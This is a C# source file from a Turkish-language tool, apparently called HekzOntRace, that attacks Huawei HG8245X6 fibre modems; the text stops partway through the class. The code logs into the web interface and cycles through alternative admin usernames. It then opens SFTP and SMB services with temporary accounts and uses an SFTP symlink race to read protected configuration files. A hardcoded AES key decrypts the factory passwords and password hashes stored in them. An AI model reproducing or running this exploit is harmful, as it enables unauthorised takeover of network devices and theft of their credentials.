// Engine.cs — BİRLEŞTİRİLMİŞ SÜRÜM (NewRelease)
//
// Temel: HekzOntRace-OpenSource (v2.2) — sağlam web girişi (HttpLoginAsync + alternatif
// kullanıcılar + oturum doğrulama), çok desenli USB algılama, hw_ctree yarışı.
// Eklenen: HekzOntRace (v1.2 kapalı sürüm) geliştirmeleri —
//   • SetupAsync ortak kurulumu (BAŞLAT ve sUser yazma paylaşır)
//   • SuserYazAsync: sUser şifresini yarışla bilinen şifreyle değiştirir (yedek alınır)
//   • YazmaYarisiAsync: SMB yazma penceresi (WROTE/WOK/WERR protokolü)
//   • TemizlikAsync: koşu sonunda USB'deki yarış dosyalarını temizler
//   • Dollar2.Encrypt + HuaweiCrypto.Encrypt: geri şifreleme (yazma için gerekli)
//   • Yazma-kabiliyetli gömülü Python yardımcısı (v9: okuma + yazma + loop;
//     cur.bin mutex, hata sayacı bağlantı başına sıfır, okunabilir hata özeti)
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Renci.SshNet;
using Renci.SshNet.Sftp;

namespace HekzOntRace.Core;

public sealed class Engine
{
    public static string MasaustuDizini()
    {
        string d = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        if (!string.IsNullOrWhiteSpace(d)) return d;
        string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        if (!string.IsNullOrWhiteSpace(home))
        {
            foreach (var sub in new[] { "Desktop", "Masaüstü" })
            {
                string p = Path.Combine(home, sub);
                if (Directory.Exists(p)) return p;
            }
            return home;
        }
        return AppContext.BaseDirectory;
    }

    internal static class SftpSymLink
    {
        public static void Create(SftpClient c, string target, string link)
        {
            object session = typeof(SftpClient).GetField("_sftpSession", BindingFlags.Instance | BindingFlags.NonPublic).GetValue(c);
            session.GetType().GetMethod("RequestSymLink", BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic)
                .Invoke(session, new object[2] { target, link });
        }
    }

    public static class Dollar2
    {
        private static readonly byte[] Key = Convert.FromHexString("6FC6E3436A53B6310DC09A475494AC774E7AFB21B9E58FC8E58B5660E48E2498");

        public static string Decrypt(string sifreli)
        {
            string sonuc;
            try
            {
                string text = sifreli.Replace("&quot;", "\"").Replace("&amp;", "&").Replace("&apos;", "'")
                    .Replace("&lt;", "<")
                    .Replace("&gt;", ">");
                text = text.Substring(2, text.Length - 1 - 2);
                int n = text.Length / 20;
                if (n < 2)
                {
                    sonuc = "";
                }
                else
                {
                    byte[] iv = StrToBytes(text.Substring((n - 1) * 20));
                    byte[] data = new byte[(n - 1) * 16];
                    for (int i = 0; i < n - 1; i++)
                    {
                        Array.Copy(StrToBytes(text.Substring(i * 20, 20)), 0, data, i * 16, 16);
                    }
                    using Aes aes = Aes.Create();
                    aes.Key = Key;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.Zeros;
                    byte[] plain = aes.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
                    int zero = Array.IndexOf(plain, (byte)0);
                    byte[] trimmed = ((zero > 0) ? plain[..zero] : plain).ToArray();
                    sonuc = ((trimmed != null && trimmed.Length > 0) ? Encoding.UTF8.GetString(trimmed) : "");
                }
            }
            catch
            {
                sonuc = "";
            }
            return sonuc;
        }

        /// <summary>Düz metni $2...$ biçimine şifreler (AES-256-CBC + Base-93, rastgele IV) — sUser yazma için.</summary>
        public static string Encrypt(string duz)
        {
            byte[] iv = RandomNumberGenerator.GetBytes(16);
            using Aes aes = Aes.Create();
            aes.Key = Key;
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.Zeros;
            byte[] pt = Encoding.UTF8.GetBytes(duz);
            byte[] ct = aes.CreateEncryptor().TransformFinalBlock(pt, 0, pt.Length);
            StringBuilder sb = new StringBuilder("$2");
            for (int i = 0; i < ct.Length; i += 16)
                sb.Append(BlokYaz(ct, i));
            sb.Append(BlokYaz(iv, 0)).Append('$');
            return sb.ToString();
        }

        /// <summary>16 bayt -> 20 Base-93 karakter (StrToBytes'in tersi; değer 30 -> '~').</summary>
        private static string BlokYaz(byte[] b, int off)
        {
            StringBuilder sb = new StringBuilder(20);
            for (int g = 0; g < 4; g++)
            {
                uint num = (uint)(b[off + g * 4] | (b[off + g * 4 + 1] << 8) | (b[off + g * 4 + 2] << 16) | (b[off + g * 4 + 3] << 24));
                uint bol = 1;
                for (int j = 0; j < 5; j++)
                {
                    uint d = (num / bol) % 93;
                    sb.Append(d == 30 ? '~' : (char)(d + 33));
                    bol *= 93;
                }
            }
            return sb.ToString();
        }

        private static byte[] StrToBytes(string s)
        {
            byte[] vals = new byte[20];
            for (int i = 0; i < 20; i++)
            {
                char c = s[i];
                vals[i] = (byte)((c == '~') ? 30 : ((byte)(c - 33)));
            }
            byte[] bytes = new byte[16];
            for (int j = 0; j < 4; j++)
            {
                uint num = 0u;
                uint mul = 1u;
                for (int k = 0; k < 5; k++)
                {
                    num += mul * vals[j * 5 + k];
                    mul *= 93;
                }
                bytes[j * 4] = (byte)(num & 0xFF);
                bytes[j * 4 + 1] = (byte)((num >> 8) & 0xFF);
                bytes[j * 4 + 2] = (byte)((num >> 16) & 0xFF);
                bytes[j * 4 + 3] = (byte)((num >> 24) & 0xFF);
            }
            return bytes;
        }
    }

    public sealed class WebHesap
    {
        public string User = "";
        public string Salt = "";
        public string FactoryPass = "";
        public string IterHex = "";
        public string IterSalt = "";
        public int IterCount = 10000;
        public int Level = -1;
        public bool Enable = true;
    }

    private readonly string _ip;
    private readonly string _adminPass;
    private readonly Action<string> _log;
    private readonly Action<string> _phase;
    private readonly CancellationToken _ct;
    private readonly Random _rng = new Random();

    public readonly string SftpUser = "hekz";
    public readonly string SftpPass;
    public readonly string SmbUser = "hekzs";
    public readonly string SmbPass;

    public string Mount = "";
    public byte[] EncryptedBlob = Array.Empty<byte>();
    public string PlainText = "";
    public string CmeiText = "";
    public bool HmacValid;
    public string CfgXml = "";
    public string PppoeUser = "";
    public string PppoePassEnc = "";
    public byte[] EncryptedCfg = Array.Empty<byte>();

    private const int SftpPort = 8022;
    private const int SmbPort = 445;

    private bool _symlinkSorunu = false;

    public string PythonPath { get; set; } = "python";
    public string LoginUser { get; set; } = "admin";
    /// <summary>sUser yazarken AclServices'te TELNETLanEnable/SSHLanEnable=1 de yapılsın mı?</summary>
    public bool TelnetSshAc { get; set; } = true;

    /// <summary>true = sUser yazmada içerik değiştirilmez, sadece yeniden şifrelenir (paketleme testi).</summary>
    public bool PaketTesti { get; set; }

    public event Action<string> OnPlainText;

    public Engine(string ip, string adminPass, Action<string> log, Action<string> phase, CancellationToken ct)
    {
        _ip = ip;
        _adminPass = adminPass;
        _log = log;
        _phase = phase;
        _ct = ct;
        SftpPass = "Hekz" + RndDigits(8);
        SmbPass = "Hekz" + RndDigits(8);   // SAMBA: yalnız harf/rakam!
        LogMaskeleyici.GizliDegerEkle(_adminPass);
        LogMaskeleyici.GizliDegerEkle(SftpPass);
        LogMaskeleyici.GizliDegerEkle(SmbPass);
    }

    public static string RndDigits(int n)
    {
        return new string(Enumerable.Range(0, n).Select(_ => (char)(48 + Random.Shared.Next(10))).ToArray());
    }

    /// <summary>
    /// Kullanıcının girdiği yeni sUser şifresini Huawei HG8245X6 kurallarına ve güvenlik politikasına göre denetler.
    /// Boş veya salt boşluk bırakıldığında otomatik 'HekzXXXXXXXX' şifresi üretir.
    /// </summary>
    public static (bool isValid, string error, string finalPassword) DogrulaYeniSuserSifresi(string input)
    {
        if (string.IsNullOrWhiteSpace(input))
        {
            return (true, null, "Hekz" + RndDigits(8));
        }

        string s = input.Trim();

        if (s.Length < 8)
            return (false, "Yeni sUser şifresi en az 8 karakter olmalıdır.", null);

        if (s.Length > 32)
            return (false, "Yeni sUser şifresi en fazla 32 karakter olabilir.", null);

        if (s.Any(char.IsWhiteSpace))
            return (false, "Yeni sUser şifresi boşluk karakteri içeremez.", null);

        if (s.Any(c => c < 33 || c > 126))
            return (false, "Şifre yalnızca standart İngilizce karakterler (ASCII) içermelidir.\nTürkçe karakterler (ç, ğ, ı, ö, ş, ü vb.) modem uyumsuzluğu nedeniyle kullanılamaz.", null);

        if (s.Any(c => c == '"' || c == '\'' || c == '<' || c == '>' || c == '\\'))
            return (false, "Şifre güvenlik nedeniyle tırnak (\", '), ters eğik çizgi (\\) veya büyüktür/küçüktür (<, >) karakterleri içeremez.", null);

        bool hasLetter = s.Any(char.IsLetter);
        bool hasDigit = s.Any(char.IsDigit);
        if (!hasLetter || !hasDigit)
            return (false, "Modem güvenlik politikası gereği şifre en az bir harf (A-Z, a-z) ve en az bir rakam (0-9) içermelidir.", null);

        return (true, null, s);
    }

    private void L(string m)
    {
        _log($"[{DateTime.Now:HH:mm:ss}] {LogMaskeleyici.Temizle(m)}");
    }

    /// <summary>Koşu gövdesi bittikten sonra (başarı veya hata fark etmeksizin) USB'yi temizler.</summary>
    public async Task RunAsync()
    {
        try { await RunAsyncGovde(); }
        finally { await TemizlikAsync(); }
    }

    private async Task RunAsyncGovde()
    {
        await SetupAsync();
        _phase("Dosya erişim köprüleri kuruluyor...");
        SetupWithRetry("/mnt/jffs2/customizepara.txt");
        L("[Erişim] Fabrika parametreleri erişim köprüsü oluşturuldu ✓");
        _phase("Fabrika parametreleri okunuyor...");
        EncryptedBlob = await RaceAsync("/mnt/jffs2/customizepara.txt", 56, 4096);
        L($"[Fabrika Parametreleri] Cihaz donanım bloğu okundu ({EncryptedBlob.Length} bayt)");
        _phase("Donanım parametreleri çözülüyor...");
        HuaweiCrypto.Result sonuc = HuaweiCrypto.Decrypt(EncryptedBlob);
        PlainText = sonuc.PlainText;
        HmacValid = sonuc.HmacValid;
        var ptParts = (PlainText ?? "").Split((char[])null, StringSplitOptions.RemoveEmptyEntries);
        if (ptParts.Length > 1) LogMaskeleyici.GizliDegerEkle(ptParts[1]);
        if (ptParts.Length > 5) LogMaskeleyici.GizliDegerEkle(ptParts[5]);
        L($"[Fabrika Parametreleri] Blok bütünlüğü doğrulandı (HMAC: {(sonuc.HmacValid ? "geçerli ✓" : "geçersiz ✗")})");
        try { OnPlainText?.Invoke(PlainText); } catch { }
        _phase("Cihaz ayar veritabanı okunuyor...");
        try
        {
            SetupWithRetry("/mnt/jffs2/hw_ctree.xml");
            L("[Konfigürasyon] Cihaz ana ayar veritabanı okunuyor...");
            byte[] blob = await RaceAsync("/mnt/jffs2/hw_ctree.xml", 56, 524288);
            if (blob != null && blob.Length > 1000)
            {
                EncryptedCfg = blob;
                L($"[Konfigürasyon] Ayar veritabanı bloğu alındı ({blob.Length:N0} bayt)");
                try
                {
                    HuaweiCrypto.Result r2 = HuaweiCrypto.Decrypt(blob);
                    if (r2.Plain.Length > 1000)
                    {
                        if (r2.Plain.Length > 2 && r2.Plain[0] == 31 && r2.Plain[1] == 139)
                        {
                            using MemoryStream ms = new MemoryStream(r2.Plain);
                            using GZipStream gz = new GZipStream(ms, CompressionMode.Decompress);
                            using MemoryStream outp = new MemoryStream();
                            gz.CopyTo(outp);
                            CfgXml = Encoding.UTF8.GetString(outp.ToArray());
                            L($"[Konfigürasyon] Ayar veritabanı AES-256 ile çözüldü ({CfgXml.Length:N0} karakter)");
                        }
                        else
                        {
                            CfgXml = r2.PlainText;
                            L($"[Konfigürasyon] Ayar veritabanı çözüldü ({r2.PlainText.Length:N0} karakter)");
                        }
                    }
                }
                catch (Exception ex)
                {
                    L("[Konfigürasyon] Çözme uyarısı: " + ex.Message + " — ham veri kaydedilecek");
                }
            }
            else
            {
                L("[Konfigürasyon] Ayar veritabanı doğrudan okunamadı — 'Konfigürasyon / PPPoE Çek' düğmesini kullanabilirsiniz.");
            }
        }
        catch (Exception ex2)
        {
            L("[Konfigürasyon] Okuma uyarısı: " + ex2.Message);
        }
        _phase("Konfigürasyon verisi başarıyla alındı ✓");
    }

    /// <summary>
    /// Ortak kurulum (BAŞLAT ve sUser yazma paylaşır):
    /// sağlam web girişi (alternatif kullanıcılarla) + oturum doğrulama + USB algılama +
    /// eski hesap temizliği + SFTP sunucu/hesap + sağlık kontrolü + SMB sunucu/hesap.
    /// </summary>
    private async Task SetupAsync()
    {
        using OntWeb web = new OntWeb(_ip);
        _phase("Cihaza bağlanılıyor...");
        (bool girisOK, string girisDetay) = await web.HttpLoginAsync(LoginUser, _adminPass, _ct);
        if (!girisOK)
        {
            L("[Oturum] '" + LoginUser + "' ile web girişi sağlanamadı — alternatif kullanıcılar deneniyor...");
            string[] alternatifler = new string[] { "admin", "root", "user", "telecomadmin", "superadmin" };
            foreach (string alt in alternatifler)
            {
                if (alt == LoginUser) continue;
                L("  [Oturum] Deneniyor: " + alt);
                if ((await web.HttpLoginAsync(alt, _adminPass, _ct)).Item1)
                {
                    LoginUser = alt;
                    L("  [Oturum] ✓ '" + alt + "' ile giriş başarılı");
                    girisOK = true;
                    break;
                }
                await Task.Delay(1000, _ct);
            }
        }
        if (!girisOK)
            throw new Exception($"Giriş başarısız: {girisDetay}\n\nDenenen: {LoginUser}, admin, root, user, telecomadmin\nKullanıcı adı ve şifreyi kontrol et");
        L("[Oturum] Web girişi başarılı (" + LoginUser + ") ✓");
        _phase("Web oturumu doğrulanıyor...");
        string sayfa = await web.GetPageAsync("html/ssmp/usbftp/usbhost.asp", _ct);
        if (!sayfa.Contains("usb") && !sayfa.Contains("USB"))
        {
            L("[Oturum] Oturum zaman aşımı — yeniden bağlanılıyor...");
            (bool ok, string detay) = await web.HttpLoginAsync(LoginUser, _adminPass, _ct);
            if (!ok) throw new Exception("İkinci giriş başarısız: " + detay);
            sayfa = await web.GetPageAsync("html/ssmp/usbftp/usbhost.asp", _ct);
            if (!sayfa.Contains("usb") && !sayfa.Contains("USB"))
                throw new Exception("Oturum kurulamadı — tarayıcı sekmelerini kapatıp tekrar dene");
            L("[Oturum] Oturum başarıyla yenilendi ✓");
        }
        else
        {
            L("[Oturum] Oturum aktif ve doğrulandı ✓");
        }
        _phase("USB depolama birimi kontrol ediliyor...");
        string usbSayfa = OntWeb.Unescape(await web.GetPageAsync("html/ssmp/usbftp/usbhost.asp", _ct));
        string[] desenler = new string[]
        {
            "USBDevice\\(\"[^\"]+\",\"([^\"]+)",
            "SftpRoorDir=\"/?/?mnt/?usb/?([^\"&\\s]+)",
            "FtpRoorDir=\"/?/?mnt/?usb/?([^\"&\\s]+)",
            "[\"'/]?(usb-[A-Za-z0-9_-]+)"
        };
        foreach (string desen in desenler)
        {
            Match m = Regex.Match(usbSayfa, desen);
            if (m.Success)
            {
                string yol = m.Groups[1].Value.TrimEnd('|').TrimEnd('/');
                if (yol.Length > 3)
                {
                    Mount = yol.StartsWith("/mnt/") ? yol : ("/mnt/usb/" + yol);
                    break;
                }
            }
        }
        if (string.IsNullOrEmpty(Mount))
        {
            Match m2 = Regex.Match(usbSayfa, "(/mnt/usb/[A-Za-z0-9_/-]+)");
            if (m2.Success) Mount = m2.Groups[1].Value.TrimEnd('/');
        }
        if (string.IsNullOrEmpty(Mount))
        {
            throw new Exception("USB algılanamadı — modeme FAT32/NTFS formatlı bir USB bellek takıp tekrar deneyin.");
        }
        L("[Depolama] USB depolama birimi bağlandı: " + Mount);
        _phase("Geçici servis hesapları taranıyor...");
        await DeleteForeignSftpAccountsAsync(web);
        _phase("SFTP dosya servisi başlatılıyor...");
        (_, string sftpSonuc) = await web.PostFormAsync(
            "setajax.cgi?x=InternetGatewayDevice.X_HW_SFTP.X_HW_SFTP_ServerInfo&RequestFile=html/ssmp/usbftp/usbhost.asp",
            "x.SftpEnable=1&x.SftpPort=8022&x.SftpLANEnable=1&x.SftpWANEnable=0&x.SftpMaxIdleDur=300&x.X_HW_Token=" + Uri.EscapeDataString(await web.TokenAsync(_ct)),
            web.Base + "/html/ssmp/usbftp/usbhost.asp", _ct);
        L(OntWeb.Unescape(sftpSonuc).Contains("\"result\": 0") ? "[SFTP] SFTP dosya transfer servisi başlatıldı (Port 8022) ✓" : ("[SFTP] Servis başlatılamadı: " + SumResult(sftpSonuc)));
        if (!OntWeb.Unescape(sftpSonuc).Contains("\"result\": 0"))
            throw new Exception("SFTP sunucusu açılamadı: " + SumResult(sftpSonuc));
        _phase("SFTP erişim hesabı yapılandırılıyor...");
        string sftpCreds = $"x.SftpEnable=1&x.SftpUserName={SftpUser}&x.SftpPassword={Uri.EscapeDataString(SftpPass)}&x.SftpRoorDir={Uri.EscapeDataString(Mount)}&x.EncryptMode=0&x.Permission=0";
        string instance = await FindSftpInstanceAsync(web);
        if (instance == null)
        {
            await web.PostFormAsync(
                "add.cgi?x=InternetGatewayDevice.X_HW_SFTP.X_HW_SFTP_ClientInfo&RequestFile=html/ssmp/usbftp/usbhost.asp",
                sftpCreds + "&x.X_HW_Token=" + Uri.EscapeDataString(await web.TokenAsync(_ct)),
                web.Base + "/html/ssmp/usbftp/usbhost.asp", _ct);
            await Task.Delay(1500, _ct);
            instance = await FindSftpInstanceAsync(web);
        }
        if (instance != null)
        {
            await web.PostFormAsync(
                "setajax.cgi?x=InternetGatewayDevice.X_HW_SFTP.X_HW_SFTP_ClientInfo." + instance + "&RequestFile=html/ssmp/usbftp/usbhost.asp",
                sftpCreds + "&x.X_HW_Token=" + Uri.EscapeDataString(await web.TokenAsync(_ct)),
                web.Base + "/html/ssmp/usbftp/usbhost.asp", _ct);
            await Task.Delay(1500, _ct);
        }
        if (!OntWeb.Unescape(await web.GetPageAsync("html/ssmp/usbftp/usbhost.asp", _ct)).Contains("\"" + SftpUser + "\""))
            throw new Exception("SFTP erişim hesabı ayarlanamadı");
        L("[SFTP] Geçici servis kimlik doğrulaması hazır: ******** / ******** (Port 8022)");
        _phase("SFTP servis testi yapılıyor...");
        if (SftpProbe())
        {
            L("[SFTP] Servis bağlantı ve dizin erişim testi başarılı ✓");
        }
        else
        {
            bool iyilesti = false;
            for (int i = 1; i <= 3; i++)
            {
                if (iyilesti) break;
                L($"[SFTP] Servis yanıt vermedi — yeniden başlatılıyor ({i}/3)...");
                await RecycleSftpAsync(web);
                if (SftpProbe())
                {
                    iyilesti = true;
                    L("[SFTP] Servis bağlantı ve dizin testi başarılı ✓");
                }
            }
            if (!iyilesti)
                throw new Exception("SFTP servisi 3 denemeye rağmen yanıt vermedi. Cihazı yeniden başlatıp tekrar deneyin.");
        }
        _phase("Samba (SMB) dosya paylaşımı açılıyor...");
        await web.PostFormAsync("set.cgi?x=InternetGatewayDevice.Services.StorageService.1.NetworkServer&RequestFile=html/ssmp/samba/sambasmart.asp",
            "x.SMBEnable=1&x.X_HW_Token=" + Uri.EscapeDataString(await web.TokenAsync(_ct)),
            web.Base + "/html/ssmp/samba/sambasmart.asp", _ct);
        await web.PostFormAsync("set.cgi?x=InternetGatewayDevice.Services.StorageService.1.NetworkServer&RequestFile=html/ssmp/samba/sambasmart.asp",
            "x.NetworkProtocolAuthReq=1&x.X_HW_Token=" + Uri.EscapeDataString(await web.TokenAsync(_ct)),
            web.Base + "/html/ssmp/samba/sambasmart.asp", _ct);
        await Task.Delay(2000, _ct);
        if (!(await web.GetPageAsync("html/ssmp/samba/sambasmart.asp", _ct)).Contains("var SMBEnable = '1'"))
            throw new Exception("SMB dosya paylaşım servisi açılamadı");
        L("[SMB] Samba dosya paylaşım servisi başlatıldı (Port 445) ✓");
        _phase("SMB paylaşım hesabı yetkilendiriliyor...");
        if (!(await TryAddSambaUserAsync(web)))
            throw new Exception("SMB paylaşım hesabı oluşturulamadı (0xf7205001). Modem arayüzünden USB dosya paylaşım ayarlarını kontrol edip tekrar BAŞLAT'a basın.");
        L("[SMB] Geçici paylaşım hesabı yapılandırıldı: ******** / ********");
    }

    private async Task<string> FindSftpInstanceAsync(OntWeb web)
    {
        Match m = Regex.Match(OntWeb.Unescape(await web.GetPageAsync("html/ssmp/usbftp/usbhost.asp", _ct)),
            "X_HW_SFTP_ClientInfo\\.(\\d+)\",\"[^\"]*\",\"" + SftpUser + "\"");
        return m.Success ? m.Groups[1].Value : null;
    }

    private async Task DeleteForeignSftpAccountsAsync(OntWeb web)
    {
        MatchCollection matches = Regex.Matches(OntWeb.Unescape(await web.GetPageAsync("html/ssmp/usbftp/usbhost.asp", _ct)),
            "X_HW_SFTP_ClientInfo\\.(\\d+)\",\"[^\"]*\",\"([^\"]+)\"");
        int silinen = 0;
        foreach (Match m in matches)
        {
            if (m.Groups[2].Value == SftpUser) continue;
            string yol = Uri.EscapeDataString("InternetGatewayDevice.X_HW_SFTP.X_HW_SFTP_ClientInfo." + m.Groups[1].Value);
            await web.PostFormAsync("del.cgi?RequestFile=html/ssmp/usbftp/usbhost.asp",
                yol + "=&x.X_HW_Token=" + Uri.EscapeDataString(await web.TokenAsync(_ct)),
                web.Base + "/html/ssmp/usbftp/usbhost.asp", _ct);
            silinen++;
            await Task.Delay(1200, _ct);
        }
        if (silinen > 0)
            L($"{silinen} eski geçici SFTP hesabı temizlendi");
    }

    private bool SftpProbe()
    {
        try
        {
            using SftpClient c = new SftpClient(_ip, 8022, SftpUser, SftpPass);
            c.OperationTimeout = TimeSpan.FromMilliseconds(8000);
            c.Connect();
            c.ListDirectory("/");
            c.Disconnect();
            return true;
        }
        catch
        {
            return false;
        }
    }

    private async Task RecycleSftpAsync(OntWeb web)
    {
        await web.PostFormAsync("setajax.cgi?x=InternetGatewayDevice.X_HW_SFTP.X_HW_SFTP_ServerInfo&RequestFile=html/ssmp/usbftp/usbhost.asp",
            "x.SftpEnable=0&x.X_HW_Token=" + Uri.EscapeDataString(await web.TokenAsync(_ct)),
            web.Base + "/html/ssmp/usbftp/usbhost.asp", _ct);
        await Task.Delay(8000, _ct);
        await web.PostFormAsync("setajax.cgi?x=InternetGatewayDevice.X_HW_SFTP.X_HW_SFTP_ServerInfo&RequestFile=html/ssmp/usbftp/usbhost.asp",
            "x.SftpEnable=1&x.SftpLANEnable=1&x.X_HW_Token=" + Uri.EscapeDataString(await web.TokenAsync(_ct)),
            web.Base + "/html/ssmp/usbftp/usbhost.asp", _ct);
        await Task.Delay(8000, _ct);
    }

    private static string SumResult(string body)
    {
        Match m = Regex.Match(body, "\\{[^}]*\\}");
        if (!m.Success)
            return body.Trim().Substring(0, Math.Min(60, body.Trim().Length));
        return m.Value;
    }

    private async Task<bool> TryAddSambaUserAsync(OntWeb web)
    {
        try
        {
            Match m = Regex.Match(OntWeb.Unescape(await web.GetPageAsync("html/ssmp/samba/sambasmart.asp", _ct)),
                "(InternetGatewayDevice\\.Services\\.StorageService\\.1\\.UserAccount\\.\\d+)\",\"" + SmbUser + "\"");
            if (m.Success)
            {
                string yol = Uri.EscapeDataString(m.Groups[1].Value);
                await web.PostFormAsync("del.cgi?RequestFile=html/ssmp/samba/sambasmart.asp",
                    yol + "=&x.X_HW_Token=" + Uri.EscapeDataString(await web.TokenAsync(_ct)),
                    web.Base + "/html/ssmp/samba/sambasmart.asp", _ct);
                await Task.Delay(1500, _ct);
            }
        }
        catch { }
        string creds = $"x.Username={SmbUser}&x.Password={SmbPass}&x.X_HW_AllPath=1&x.X_HW_Permissions=1&x.Enable=1";
        string[] govde = new string[]
        {
            creds + "&y.Name=mnt%2Fusb",
            creds,
            creds + "&y.Name=mnt%2Fusb&z.UserReference=" + SmbUser + "&z.Permissions=4"
        };
        foreach (string b in govde)
        {
            _ct.ThrowIfCancellationRequested();
            string full = b + "&x.X_HW_Token=" + Uri.EscapeDataString(await web.TokenAsync(_ct));
            await web.PostFormAsync("addcfg.cgi?x=InternetGatewayDevice.Services.StorageService.1.UserAccount&RequestFile=html/ssmp/samba/sambasmart.asp",
                full, web.Base + "/html/ssmp/samba/sambasmart.asp", _ct);
            await Task.Delay(2000, _ct);
            if ((await web.GetPageAsync("html/ssmp/samba/sambasmart.asp", _ct)).Contains(SmbUser))
                return true;
        }
        return false;
    }

    // hatalar yutulmuyor; symlink kurulamazsa yarış yine de denenir
    // (Python yardımcısı kendi tarafında symlink'i onarmayı dener).
    private void SetupWithRetry(string target)
    {
        bool realOk = false;
        bool lnkOk = false;
        for (int i = 1; i <= 3; i++)
        {
            try
            {
                using SftpClient c = new SftpClient(_ip, 8022, SftpUser, SftpPass)
                {
                    OperationTimeout = TimeSpan.FromSeconds(15),
                    KeepAliveInterval = TimeSpan.FromSeconds(15)
                };
                c.Connect();
                L("SFTP bağlantısı OK");
                SetupRaceFiles(c, target);
                realOk = SafeLstat(c, "real.bin");
                lnkOk = SafeLstat(c, "lnk.bin");
                if (realOk && lnkOk) return;
                if (!realOk)
                {
                    L("Geçici aktarım dosyası doğrulanamadı, tekrar denenecek");
                    Thread.Sleep(2500);
                    continue;
                }
                // real.bin var ama symlink yok: Python yardımcısı onarabilir — yarışı engelleme
                L("⚠ Dosya erişim köprüsü kurulamadı — yardımcı bileşen yeniden deneyecek");
                return;
            }
            catch (Exception ex)
            {
                L($"Kurulum hatası (deneme {i}): {ex.Message}");
                Thread.Sleep(2500);
            }
        }
        if (!realOk)
            throw new Exception("Geçici aktarım dosyaları kurulamadı (SFTP) — yukarıdaki deneme hatalarına bakın");
    }

    private void SetupRaceFiles(SftpClient sftp, string target)
    {
        foreach (string n in new string[] { "cur.bin", "real.bin", "lnk.bin", "lnk2.bin", "lnk3.bin" })
        {
            try { sftp.Delete(n); }
            catch { }
        }
        try
        {
            sftp.WriteAllText("real.bin", "R");
        }
        catch (Exception ex)
        {
            L("  Geçici aktarım dosyası yazılamadı: " + Kisa(ex));
        }
        try
        {
            SftpSymLink.Create(sftp, target, "lnk.bin");
            L("  Dosya erişim köprüsü oluşturuldu ✓");
        }
        catch (Exception ex)
        {
            _symlinkSorunu = true;
            string msg = ex.Message;
            L("  Dosya erişim köprüsü oluşturulamadı: " + msg);
            string m = msg.ToLowerInvariant();
            if (m.Contains("permission") || m.Contains("denied"))
                L("  → Muhtemel neden: USB bellek FAT32/exFAT. İşlem için belleği NTFS olarak formatlayıp modeme yeniden takın.");
            else if (m.Contains("unsupported") || m.Contains("operation not") || m.Contains("not supported"))
                L("  → Cihazın SFTP sunucusu bu dosya sisteminde erişim köprüsü oluşturamıyor — USB belleği NTFS formatlayıp tekrar deneyin.");
        }
    }

    private static string Kisa(Exception ex)
    {
        string s = ex.Message;
        return s.Length > 120 ? s.Substring(0, 120) : s;
    }

    // SSH.NET Exists() kırık (broken) symlink için false döner.
    // ListDirectory tabanlı kontrol symlink'in kendisini görür (lstat davranışı).
    private static bool SafeLstat(SftpClient c, string p)
    {
        try
        {
            string dir = ".";
            string file = p;
            int idx = p.LastIndexOf('/');
            if (idx >= 0)
            {
                dir = (idx == 0) ? "/" : p[..idx];
                file = p[(idx + 1)..];
            }
            foreach (SftpFile f in c.ListDirectory(dir))
                if (f.Name == file)
                    return true;
            return false;
        }
        catch
        {
            return false;
        }
    }

    /// <summary>lstat davranışlı öznitelik sorgusu — yazma yarışında symlink'in gerçekliği denetlenir.</summary>
    private static SftpFileAttributes Lstat(SftpClient c, string ad)
    {
        try { return c.ListDirectory(".").FirstOrDefault(f => f.Name == ad)?.Attributes; }
        catch { return null; }
    }

    private static void Try(SftpClient c, Action a)
    {
        try { a(); } catch { }
    }

    public static List<WebHesap> WebHesaplariCek(string cfgXml)
    {
        List<WebHesap> list = new List<WebHesap>();
        if (string.IsNullOrEmpty(cfgXml)) return list;
        foreach (Match m in Regex.Matches(cfgXml, "<X_HW_WebUserInfoInstance\\b[^>]*>.*?</X_HW_WebUserInfoInstance>", RegexOptions.Singleline))
        {
            string tag = m.Value;
            int seviye;
            WebHesap h = new WebHesap
            {
                User = WebUtility.HtmlDecode(Attr(tag, "UserName")),
                Salt = WebUtility.HtmlDecode(Attr(tag, "Salt")),
                Level = int.TryParse(Attr(tag, "UserLevel"), out seviye) ? seviye : -1,
                Enable = Attr(tag, "Enable") != "0"
            };
            string fp = Attr(tag, "FactoryPassword");
            if (fp.StartsWith("$2"))
            {
                h.FactoryPass = Dollar2.Decrypt(fp);
                LogMaskeleyici.GizliDegerEkle(h.FactoryPass);
            }
            Match ip = Regex.Match(tag, "<X_HW_IteratePassword\\b[^>]*/>");
            if (ip.Success)
            {
                h.IterSalt = WebUtility.HtmlDecode(Attr(ip.Value, "Salt"));
                if (!int.TryParse(Attr(ip.Value, "IterateCount"), out h.IterCount) || h.IterCount <= 0)
                    h.IterCount = 10000;
                string pw = Attr(ip.Value, "Password");
                if (pw.StartsWith("$2")) h.IterHex = Dollar2.Decrypt(pw).Trim('\0', ' ');
            }
            if (h.User.Length > 0) list.Add(h);
        }
        return list;
    }

    private static string Attr(string tag, string ad)
    {
        return Regex.Match(tag, ad + "=\"([^\"]*)\"").Groups[1].Value;
    }

    public static bool SifreDogrula(WebHesap h, string aday)
    {
        if (h == null || h.IterHex.Length != 64 || string.IsNullOrEmpty(aday) || h.IterSalt.Length == 0)
            return false;
        try
        {
            using Rfc2898DeriveBytes rfc = new Rfc2898DeriveBytes(Encoding.UTF8.GetBytes(aday), Encoding.UTF8.GetBytes(h.IterSalt), h.IterCount, HashAlgorithmName.SHA256);
            return Convert.ToHexString(rfc.GetBytes(32)).Equals(h.IterHex, StringComparison.OrdinalIgnoreCase);
        }
        catch
        {
            return false;
        }
    }

    private static string HelperYaz()
    {
        string dosya = Path.Combine(Path.GetTempPath(), "hekz_" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".py");
        using MemoryStream ms = new MemoryStream(Convert.FromBase64String(GomuluHelper));
        using GZipStream gz = new GZipStream(ms, CompressionMode.Decompress);
        using MemoryStream outp = new MemoryStream();
        gz.CopyTo(outp);
        File.WriteAllBytes(dosya, outp.ToArray());
        return dosya;
    }

